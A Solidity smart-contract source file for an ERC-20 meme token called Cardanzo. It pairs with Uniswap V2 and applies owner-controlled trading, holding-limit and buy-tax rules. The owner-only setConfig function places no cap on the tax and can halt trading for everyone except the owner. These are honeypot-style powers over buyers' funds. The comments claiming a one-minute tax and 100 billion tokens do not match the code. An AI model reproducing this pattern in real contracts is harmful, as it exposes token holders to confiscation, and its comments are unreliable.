// SPDX-License-Identifier: Unlicense
pragma solidity >=0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "lib/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "lib/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";

/*
Twitter: https://twitter.com/Cardanzoethcoin
*/
contract Cardanzo is ERC20, Ownable {
    address public pair;
    uint256 public taxPercent;
    uint256 public maxHoldingAmount;
    bool public taxOn = true; // tax only for first min to prevent MEV
    bool public limitOn = true;
    bool public tradingOn = false;

    constructor() ERC20("Cardanzo", "CARDANZO") {
        // 100 billion tokens
        uint256 _totalSupply = 10 * 10 ** 9 * 10 ** 18;
        _mint(msg.sender, _totalSupply);
        maxHoldingAmount = _totalSupply / 50; // 2%
        taxPercent = 0.25 ether;
        address ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        pair = IUniswapV2Factory(IUniswapV2Router02(ROUTER).factory()).createPair(WETH, address(this));
    }

    function setConfig(
        bool _tradingOn,
        bool _limitOn,
        bool _taxOn,
        uint256 _taxPercent,
        uint256 _maxHoldingAmount
    ) external onlyOwner {
        tradingOn = _tradingOn;
        limitOn = _limitOn;
        taxOn = _taxOn;
        taxPercent = _taxPercent;
        maxHoldingAmount = _maxHoldingAmount;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal override {
        if (!tradingOn) {
            require(sender == owner() || recipient == owner(), "Trading not enabled");
        } else if (limitOn && sender == pair) {
            require(super.balanceOf(recipient) + amount <= maxHoldingAmount, "Max holding amount exceeded");
        }
        if (taxOn && sender == pair && recipient != owner()) {
            uint256 tax = (amount * taxPercent) / 1 ether;
            super._transfer(sender, owner(), tax);
            amount -= tax;
        }
        super._transfer(sender, recipient, amount);
    }
}